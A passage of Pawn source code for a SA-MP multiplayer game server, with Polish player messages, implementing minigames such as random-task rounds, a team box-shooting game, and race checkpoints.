  		 		case 8: SetPlayerPos(playerid, 3223.5198,1892.7367,19.7842); }
	        SetPlayerHealth(playerid, 9999.0);
			ResetPlayerWeapons(playerid);
			SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid);
		}
	}
	TR_Round();
	RefreshZabawy();
	return 1;
}

forward TR_Round();
public TR_Round() {
	TRRound++;
	SetTimer("TR_LosujPredkosc", 3500, 0); }

forward TR_LosujPredkosc();
public TR_LosujPredkosc()
{
	switch(random(4))
	{
	    case 0: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
 					GameTextForPlayer(playerid, "~g~~h~~h~Predkosc zadania~n~~p~~h~SZYBKO", 4000, 3); } }
			TRTimer = 5; }
	    case 1: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
 					GameTextForPlayer(playerid, "~g~~h~~h~Predkosc zadania~n~~p~~h~BARDZO SZYBKO", 4000, 3); } }
			TRTimer = 4; }
	    case 2: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
 					GameTextForPlayer(playerid, "~g~~h~~h~Predkosc zadania~n~~p~~h~SREDNIA", 4000, 3); } }
			TRTimer = 7; }
	    case 3: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
 					GameTextForPlayer(playerid, "~g~~h~~h~Predkosc zadania~n~~p~~h~WOLNO", 4000, 3); } }
			TRTimer = 8; }
	}
	SetTimer("TR_RoundStart", 4000, 0);
}

forward BA_Team(playerid);
public BA_Team(playerid) {
	new czerwoni = 0, zolci = 0, niebiescy = 0, zieloni = 0;
	Loop(loopid, MAX_PLAYERS) {
	    if(BATeam[loopid] == 0) czerwoni++; }
	if(czerwoni == 0) {
	    TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, 342.3120,3143.2139,13.0912);
        SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid);
		BATeam[playerid] = 0;
		SendClientMessage(playerid, -1, "{FF0000}Zosta³eœ przydzielony do koloru czerwonego. Powodzenia!");
		return SetPlayerColor(playerid, RED); }
	Loop(loopid, MAX_PLAYERS) {
	    if(BATeam[loopid] == 1) zieloni++; }
	if(zieloni == 0) {
	    TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, 210.8090,3054.0347,13.0912);
		SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid);
		BATeam[playerid] = 1;
		SendClientMessage(playerid, -1, "{10ff00}Zosta³eœ przydzielony do koloru zielonego. Powodzenia!");
		return SetPlayerColor(playerid, LIME); }
	Loop(loopid, MAX_PLAYERS) {
	    if(BATeam[loopid] == 2) niebiescy++; }
	if(niebiescy == 0) {
	    TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, 208.5384,3139.4480,13.0912);
		SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid);
		BATeam[playerid] = 2;
        SendClientMessage(playerid, -1, "{4982f4}Zosta³eœ przydzielony do koloru niebieskiego. Powodzenia!");
		return SetPlayerColor(playerid, BLUE); }
	Loop(loopid, MAX_PLAYERS) {
	    if(BATeam[loopid] == 3) zolci++; }
	if(zolci == 0) {
	    TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, 344.0521,3059.0693,13.0912);
		SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid);
		BATeam[playerid] = 3;
        SendClientMessage(playerid, -1, "{FF0000}Zosta³eœ przydzielony do koloru ¿ó³tego. Powodzenia!");
		return SetPlayerColor(playerid, YELLOW); }
	return 1;
}

forward BA_Start();
public BA_Start()
{
	if(Osoby[BA] < Min[BA]) {
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == BA) OnGame[playerid] = -1; }
	    Startuje[BA] = false;
		return RefreshZabawy(); }
	boxes = 0;
	BAPlayers = 0;
	Wystartowala[BA] = true;
	Startuje[BA] = false;
	Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid)) BATeam[playerid] = -1; }
	Loop(teamy, MAX_BATEAMS) PunktyBA[teamy] = 14;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == BA && IsPlayerConnected(playerid)) {
	        BAPlayers++;
	        ForceObj(playerid);
	        BA_Team(playerid);
	        SetPlayerVirtualWorld(playerid, 120);
	        TogglePlayerControllable(playerid, 0);
	        SetPlayerHealth(playerid, 100.0);
	        SetPlayerArmour(playerid, 100.0);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 24, 9999);
	        new infostr[256];
	        format(infostr, sizeof(infostr), ""PYTAJNIK""C_ORANGE"Twoim zadaniem jest wyeliminowanie reszty dru¿yn strzelaj¹c w {FF0000}kolorowe punkty "C_ORANGE"na s³upach.");
			SendClientMessage(playerid, -1, infostr);
			SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid);
		}
	}
	AddBABox(1, 210.51321, 3055.88452, 21.43540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.26079, 3055.90039, 20.73540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.26079, 3055.90039, 20.03540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.30000, 3055.89258, 19.33540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.28040, 3055.89648, 18.63540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.28040, 3055.89648, 17.93540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.28040, 3055.89648, 17.23540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 211.25676, 3055.90479, 21.43540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 210.51320, 3055.88452, 20.73540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 210.51320, 3055.88452, 20.03540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 210.51320, 3055.88452, 19.33540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 210.51320, 3055.88452, 18.63540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 210.51320, 3055.88452, 17.93540,   0.00000, 0.00000, 0.00000);
	AddBABox(1, 210.51320, 3055.88452, 17.23540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 21.43540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41280, 3141.07690, 20.73540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41280, 3141.07690, 20.03540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41280, 3141.07690, 19.33540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41280, 3141.07690, 18.60000,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41280, 3141.07690, 17.90000,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41280, 3141.07690, 17.20000,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 210.41284, 3141.07690, 21.43540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 20.73540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 20.03540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 19.33540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 18.63540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 17.93540,   0.00000, 0.00000, 0.00000);
	AddBABox(2, 209.68680, 3141.05811, 17.23540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63913, 3142.12476, 21.43540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 21.43540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63910, 3142.12476, 20.73540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63910, 3142.12476, 20.03540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63910, 3142.12476, 19.33540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63910, 3142.12476, 18.63540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 17.93540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63910, 3142.12476, 17.23540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 20.73540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 20.03540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 19.33540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 18.63540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 342.63910, 3142.12476, 17.93540,   0.00000, 0.00000, 0.00000);
	AddBABox(0, 341.91910, 3142.12476, 17.23540,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79117, 3057.98267, 21.44145,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79120, 3057.98267, 20.74150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79120, 3057.98267, 20.04150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79120, 3057.98267, 19.34150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79120, 3057.98267, 18.64150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79120, 3057.98267, 17.94150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 342.79120, 3057.98267, 17.24150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 21.44150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 20.74150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 20.04150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 19.34150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 18.64150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 17.94150,   0.00000, 0.00000, 0.00000);
	AddBABox(3, 343.49121, 3057.98267, 17.24150,   0.00000, 0.00000, 0.00000);
	RefreshZabawy();
	return 1;
}

forward BA_Check();
public BA_Check() {
	if(BAPlayers < 2 && Wystartowala[BA]) {
		Loop(playerid, MAX_PLAYERS) {
	    	if(IsPlayerConnected(playerid) && OnGame[playerid] == BA) {
  				AddExp(playerid, 500);
    			Player[playerid][Cash] += 20000;
    			new msgstr[256];
    			format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/BA"C_ZABAWA".", Player[playerid][Name], playerid);
    			SendClientMessageToAll(-1, msgstr);
    			ResetPlayerWeapons(playerid);
    			SetPlayerVirtualWorld(playerid, 0);
    			SpawnFunction(playerid);
    			Player[playerid][Zabawyp]++;
				return BA_End(); } } }
	return 1; }

forward BA_End();
public BA_End() {
	if(boxes > 0) DeleteBoxes();
	Startuje[BA] = false;
	Osoby[BA] = 0;
	Wystartowala[BA] = false;
	Loop(playerid, MAX_PLAYERS) {
	    if(OnGame[playerid] == BA) {
		   	SetPlayerVirtualWorld(playerid, 0);
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	   		ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); } }
	RefreshZabawy();
	return 1; }

stock SetVehicleSpeed(vehicleid, Float:speed)
{
	new Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2, Float:a;
	GetVehicleVelocity(vehicleid, x1, y1, z1);
	GetVehiclePos(vehicleid, x2, y2, z2);
	GetVehicleZAngle(vehicleid, a); a = 360 - a;
	x1 = (floatsin(a, degrees) * (speed/100) + floatcos(a, degrees) * 0 + x2) - x2;
	y1 = (floatcos(a, degrees) * (speed/100) + floatsin(a, degrees) * 0 + y2) - y2;
	SetVehicleVelocity(vehicleid, x1, y1, z1);
}

AddhajsOnTR(Float:x, Float:y, Float:z) {
	HajsPickup[stworzonehajsy] = CreateDynamicPickup(1212, 1, x, y, z, 112, -1, -1, 60.0);
	HajsPodniesiony[stworzonehajsy] = false;
	stworzonehajsy++; }

forward RespawnHajs();
public RespawnHajs() {
	stworzonehajsy = 0;
   	AddhajsOnTR(3143.3994,1983.9484,19.7842);
 	AddhajsOnTR(3171.6265,1966.2305,19.7842);
  	AddhajsOnTR(3221.7163,1966.6907,19.7842);
  	AddhajsOnTR(3246.8069,1984.2554,19.7842);
  	AddhajsOnTR(3207.6377,1946.0270,19.7842);
  	AddhajsOnTR(3144.8003,1908.7218,19.7842);
  	AddhajsOnTR(3150.3613,1880.3467,19.7842);
  	AddhajsOnTR(3138.0674,1864.2030,19.7842);
  	AddhajsOnTR(3221.2808,1881.4910,19.7842);
  	AddhajsOnTR(3245.3494,1923.3641,19.7842);
  	AddhajsOnTR(3245.1248,1863.2655,19.7842);
	AddhajsOnTR(3198.5867,1901.9261,19.7842);
	AddhajsOnTR(3233.0083,1918.3296,19.7842);
	AddhajsOnTR(3223.1550,1899.2330,19.7842);
	AddhajsOnTR(3236.1646,1940.9739,19.7842);
	AddhajsOnTR(3222.1765,1932.3401,19.7842);
	AddhajsOnTR(3209.4888,1922.9243,19.7842);
	AddhajsOnTR(3170.1624,1901.1779,19.7842);
	AddhajsOnTR(3212.5950,1907.7776,19.7842);
	AddhajsOnTR(3209.2961,1891.2731,19.7842);
	AddhajsOnTR(3191.1934,1924.4347,19.7842);
	AddhajsOnTR(3234.6563,1973.7004,19.7842);
	AddhajsOnTR(3214.1738,1974.8300,19.7842);
	AddhajsOnTR(3185.8792,1973.0527,19.7842);
	AddhajsOnTR(3196.6453,1964.4470,19.7842);
	AddhajsOnTR(3199.8716,1925.0605,19.7842);
	AddhajsOnTR(3216.4229,1965.3065,19.7842);
	AddhajsOnTR(3198.9441,1908.5195,19.7842);
	AddhajsOnTR(3207.8071,1906.1616,19.7842); }

forward TR_RoundStart();
public TR_RoundStart() {
	TRRundaTrwa = true;
	TRType = random(8);
	switch(TRType)
	{
	    case 0: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Skocz!", 1000*TRTimer, 3); } } }
	    case 1: {
	        new rozwiazanie[256], math1, math2;
	 		math1 = random(100);
			math2 = random(100);
         	switch(random(2))
	        {
	            case 0: {
	                TRMath = math1 + math2;
					format(rozwiazanie, sizeof(rozwiazanie), "~n~~n~~n~~n~~n~~r~~h~~h~Oblicz~n~~r~~h~~h~%d ~y~+ ~r~~h~~h~%d", math1, math2); }
	            case 1: {
	                TRMath = math1 - math2;
					format(rozwiazanie, sizeof(rozwiazanie), "~n~~n~~n~~n~~n~~r~~h~~h~Oblicz~n~~r~~h~~h~%d ~y~- ~r~~h~~h~%d", math1, math2); }
			}
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR && IsPlayerConnected(playerid)) {
	        		GameTextForPlayer(playerid, rozwiazanie, 1000*TRTimer, 3); } } }
	    case 2: {
	        SetTimer("TR_CheckPos", 1000*TRTimer-2, 0);
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	                GetPlayerPos(playerid, TRx[playerid], TRy[playerid], TRz[playerid]);
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Nie ruszaj sie!", 1000*TRTimer, 3); } } }
	    case 3: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	                DisableRemoteVehicleCollisions(playerid, 1);
	                TRVeh[playerid] = CreateVehicle(402,1792.2733,852.4813,10.5031,89.6679, 1, 1, 100);
	                SetVehicleVirtualWorld(TRVeh[playerid], 112);
	                PutPlayerInVehicle(playerid, TRVeh[playerid], 0);
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Zatrzymaj pojazd", 1000*TRTimer, 3);
					SetVehicleSpeed(TRVeh[playerid], 100); } } }
	    case 4: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Kucnij!", 1000*TRTimer, 3); } } }
	    case 5: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	                DisableRemoteVehicleCollisions(playerid, 1);
	                SetVehicleVirtualWorld(TRVeh[playerid], 112);
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Traf w checkpoint", 1000*TRTimer, 3);
	        		TRVeh[playerid] = CreateVehicle(522,2057.2871,862.4404,6.3992,186.0195, 1, 1, 100);
	                PutPlayerInVehicle(playerid, TRVeh[playerid], 0);
	        		SetPlayerRaceCheckpoint(playerid,1,2057.8315,728.2224,15.5093, 0.0,0.0,0.0,5);
					SetVehicleSpeed(TRVeh[playerid], 120); } } }
	    case 6: {
	        RespawnHajs();
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	                TRHajs[playerid] = 0;
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Zbierz 3000~y~~h~$", 1000*TRTimer, 3); } } }
	    case 7: {
	        Loop(playerid, MAX_PLAYERS) {
	            if(OnGame[playerid] == TR) {
	                GivePlayerWeapon(playerid, 24, 9999);
	        		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~r~~h~~h~Strzel w innego gracza", 1000*TRTimer, 3); } } }
	}
	Loop(playerid, MAX_PLAYERS) {
		if(OnGame[playerid] == TR && IsPlayerConnected(playerid)) {
			WykonalTR[playerid] = false; } }
	SetTimer("TR_Check", 1000*TRTimer, 0);
}

forward TR_CheckPos();
public TR_CheckPos() {
	Loop(playerid, MAX_PLAYERS) {
		if(OnGame[playerid] == TR && TRRundaTrwa) {
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid, x, y, z);
			if(x == TRx[playerid] && y == TRy[playerid] && z == TRz[playerid]) {
   				WykonalTR[playerid] = true;
    			PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    			GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); } } } }

forward TR_Check();
public TR_Check()
{
	TRRundaTrwa = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(TRType == 3 || TRType == 5) DestroyVehicle(TRVeh[playerid]);
		if(TRType == 7) ResetPlayerWeapons(playerid);
		if(TRType == 6) {
	        Loop(hajs, MAX_TRHAJS) {
				if(!HajsPodniesiony[hajs]) {
					DestroyDynamicPickup(HajsPickup[hajs]); } } }
	    if(OnGame[playerid] == TR && IsPlayerConnected(playerid))
	    {
	        DisableRemoteVehicleCollisions(playerid, 0);
	        DisablePlayerRaceCheckpoint(playerid);
	        if(WykonalTR[playerid])
	        {
	        	SetPlayerVirtualWorld(playerid, 112);
	        	TogglePlayerControllable(playerid, 0);
	       		switch(random(9)) {
	    			case 0: SetPlayerPos(playerid, 3146.1948,1876.0012,19.7842);
	    			case 1: SetPlayerPos(playerid, 3239.7458,1867.4421,19.7842);
	    			case 2: SetPlayerPos(playerid, 3247.3184,1983.5540,19.7842);
	    			case 3: SetPlayerPos(playerid, 3146.0886,1982.9078,19.7842);
	    			case 4: SetPlayerPos(playerid, 3185.0862,1949.1427,19.7842);
  		 			case 5: SetPlayerPos(playerid, 3200.1208,1921.9686,19.7842);
  		 			case 6: SetPlayerPos(playerid, 3180.1052,1956.6196,19.7842);
  		 			case 7: SetPlayerPos(playerid, 3221.9724,1965.6299,19.7842);
  		 			case 8: SetPlayerPos(playerid, 3223.5198,1892.7367,19.7842); }
	        	SetPlayerHealth(playerid, 9999.0);
				ResetPlayerWeapons(playerid);
				AddExp(playerid, 5);
				SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid);
			}
			else {
			    SetPlayerVirtualWorld(playerid, 0);
			    WypiszZabawa(playerid);
				TRPlayers--; }
	    }
	}
	if(TRPlayers < 2)
	{
		Loop(playerid, MAX_PLAYERS)
		{
	    	if(OnGame[playerid] == TR && IsPlayerConnected(playerid))
	    	{
	    	    new msgstr[256];
    			format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/TR"C_ZABAWA".", Player[playerid][Name], playerid);
    			SendClientMessageToAll(-1, msgstr);
    			AddExp(playerid, 50);
	    	}
		}
		return TR_End();
	}
	if(TRRound >= 20) {
	    new ilosc = 0;
		Loop(playerid, MAX_PLAYERS) {
	    	if(OnGame[playerid] == TR && IsPlayerConnected(playerid)) {
	    	    ilosc++;
    			AddExp(playerid, 200); } }
	    new msgstr[256];
    	format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_ZABAWA" Zabawê "C_WHITE"/TR"C_ZABAWA" wygrywa "C_WHITE"%d "C_ZABAWA"osób.", ilosc);
    	SendClientMessageToAll(-1, msgstr);
		return TR_End(); }
	TRRundaTrwa = false;
	SetTimer("TR_LosujPredkosc", 5000, 0);
	return 1;
}

forward TR_End();
public TR_End() {
	Startuje[TR] = false;
	Osoby[TR] = 0;
	Wystartowala[TR] = false;
	Loop(playerid, MAX_PLAYERS) {
	    if(OnGame[playerid] == TR) {
		   	SetPlayerVirtualWorld(playerid, 0);
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	   		ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); } }
	RefreshZabawy();
	return 1; }

DeleteBoxes() {
	Loop(box, MAX_BABOXES) {
		if(BoxOnMap[box]) {
			DestroyDynamicObject(Box[box]);
			BoxOnMap[box] = false; } } }

AddBABox(type, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz) {
	if(boxes >= MAX_BABOXES) return 1;
    Box[boxes] = CreateDynamicObject(1271, x, y, z, rx, ry, rz, 120, -1, -1, 300.00, 300.00);
    BoxOnMap[boxes] = true;
    BoxType[boxes] = type;
    if(type == 0) SetDynamicObjectMaterial(Box[boxes], 0, 18646, "matcolours", "grey-40-percent", 0xFFFF0000); // czerwony
	if(type == 1) SetDynamicObjectMaterial(Box[boxes], 0, 18646, "matcolours", "grey-40-percent", 0xFF33FF00); // zielony
    if(type == 2) SetDynamicObjectMaterial(Box[boxes], 0, 18646, "matcolours", "grey-40-percent", 0xFF000099); // niebieski
    if(type == 3) SetDynamicObjectMaterial(Box[boxes], 0, 18646, "matcolours", "grey-40-percent", 0xFFFFFF00); // ¿ó³ty
	return boxes++;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
  if(TRRundaTrwa && OnGame[playerid] == TR && Wystartowala[TR] && !WykonalTR[playerid] && TRType == 5) {
    DisablePlayerRaceCheckpoint(playerid);
    WykonalTR[playerid] = true;
    PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); }
	if(NaSpedycji[playerid]) {
		TogglePlayerControllable(playerid, 0);
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Roz³adunek towaru", ""C_BLUE1"Towar jest roz³adowywany.\nUkoñczono "C_WHITE"0 "C_BLUE1"procent.", "Zamknij", "");
		SpeZal[playerid] = 0;
		return SetTimerEx("Rozladunek", 1500, 0, "i", playerid); }
	if(RCCheckpoint[playerid] != -1 && OnGame[playerid] == RC)
	{
	    if(RCCheckpoint[playerid] == 0 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 1;
	        return SetPlayerRaceCheckpoint(playerid,0,1867.3853,758.3105,10.6719,2006.8025,753.2240,10.6719,4); }
	    if(RCCheckpoint[playerid] == 1 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 2;
	        return SetPlayerRaceCheckpoint(playerid,0,2006.8025,753.2240,10.6719,2132.6709,753.1927,10.6719,4); }
	    if(RCCheckpoint[playerid] == 2 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 3;
	        return SetPlayerRaceCheckpoint(playerid,0,2132.6709,753.1927,10.6719,2147.4192,960.3808,10.7288,4); }
	    if(RCCheckpoint[playerid] == 3 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 4;
	        return SetPlayerRaceCheckpoint(playerid,0,2147.4192,960.3808,10.7288,2085.1338,973.1752,10.6719,4); }
	    if(RCCheckpoint[playerid] == 4 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 5;
	        return SetPlayerRaceCheckpoint(playerid,0,2085.1338,973.1752,10.6719,2066.4697,1181.1184,10.6719,4); }
	    if(RCCheckpoint[playerid] == 5 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 6;
	        return SetPlayerRaceCheckpoint(playerid,0,2066.4697,1181.1184,10.6719,2594.7568,1193.2184,10.6719,4); }
	    if(RCCheckpoint[playerid] == 6 && RaceID == 0) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 7;
	        return SetPlayerRaceCheckpoint(playerid,1,2594.7568,1193.2184,10.6719,2594.7568,1193.2184,10.6719,5); }
	    if(RCCheckpoint[playerid] == 7 && RaceID == 0) {
  			new rcendtick = GetTickCount();
			new czasrc = rcendtick - rcstarttick;
	        RCCheckpoint[playerid] = -1;
	        DisablePlayerRaceCheckpoint(playerid);
	        RemovePlayerFromVehicle(playerid);
	        DestroyVehicle(RCVehicle[playerid]);
	        RCPlace++;
	        new finishstr[256];
	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
	        SendClientMessageToAll(-1, finishstr);
			if(RCPlace == 1) AddExp(playerid, 50);
			if(RCPlace == 2) AddExp(playerid, 30);
			if(RCPlace == 3) AddExp(playerid, 20);
			if(RCPlace == 4) AddExp(playerid, 10);
			if(RCPlace == 5) AddExp(playerid, 5);
			RCEnding = SetTimer("RC_End", 1000*30, 0);
	        WypiszZabawa(playerid);
	        if(RCPlayers == 0) return RC_End(); }
	    if(RCCheckpoint[playerid] == 0 && RaceID == 1) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 1;
	        return SetPlayerRaceCheckpoint(playerid,0,1035.0684,-1788.4596,13.6272,476.9620,-1708.5613,11.2815,4); }
	    if(RCCheckpoint[playerid] == 1 && RaceID == 1) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 2;
	        return SetPlayerRaceCheckpoint(playerid,0,476.9620,-1708.5613,11.2815,356.2873,-1769.7268,5.2391,4); }
	    if(RCCheckpoint[playerid] == 2 && RaceID == 1) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 3;
	        return SetPlayerRaceCheckpoint(playerid,0,356.2873,-1769.7268,5.2391,131.7428,-1583.3513,10.8518,4); }
	    if(RCCheckpoint[playerid] == 3 && RaceID == 1) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 4;
	        return SetPlayerRaceCheckpoint(playerid,1,131.7428,-1583.3513,10.8518,131.7428,-1583.3513,10.8518,4); }
	    if(RCCheckpoint[playerid] == 4 && RaceID == 1) {
  			new rcendtick = GetTickCount();
			new czasrc = rcendtick - rcstarttick;
	        RCCheckpoint[playerid] = -1;
	        DisablePlayerRaceCheckpoint(playerid);
	        RemovePlayerFromVehicle(playerid);
	        DestroyVehicle(RCVehicle[playerid]);
	        RCPlace++;
	        new finishstr[256];
	        format(finishstr, sizeof(finishstr), ""C_WHITE"["C_ZABAWA"Race"C_WHITE"] %s {F5F96B}koñczy wyœcig na miejscu "C_WHITE"%d{F5F96B} w czasie "C_WHITE"%s{F5F96B}!", Player[playerid][Name], RCPlace, ConvertMsToTime(czasrc));
	        SendClientMessageToAll(-1, finishstr);
			if(RCPlace == 1) AddExp(playerid, 50);
			if(RCPlace == 2) AddExp(playerid, 30);
			if(RCPlace == 3) AddExp(playerid, 20);
			if(RCPlace == 4) AddExp(playerid, 10);
			if(RCPlace == 5) AddExp(playerid, 5);
			RCEnding = SetTimer("RC_End", 1000*30, 0);
	        WypiszZabawa(playerid);
	        if(RCPlayers == 0) return RC_End(); }
	    if(RCCheckpoint[playerid] == 0 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 1;
	        return SetPlayerRaceCheckpoint(playerid,0,-2542.4004,340.4751,19.7831,-2387.6062,503.7651,29.1972,4); }
	    if(RCCheckpoint[playerid] == 1 && RaceID == 2) {
	        PlayerPlaySound(playerid, 17006, 0.0, 0.0, 0.0);
	        RCCheckpoint[playerid] = 2;
	        return SetPlayerRaceCheckpoint(playerid,0,-2387.6062,503.7651,29.1972,-2251.7427,332.2492,34.9551,4); }
